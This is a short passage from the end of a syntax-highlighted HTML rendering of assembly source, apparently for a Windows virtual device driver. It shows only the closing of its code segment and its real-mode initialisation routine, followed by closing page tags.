</span><span class="sc5">VxD_CODE_ENDS</span><span class="sc0">


        </span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">VVD_Real_Mode_Init</span><span class="sc0">
</span></div></body>
</html>
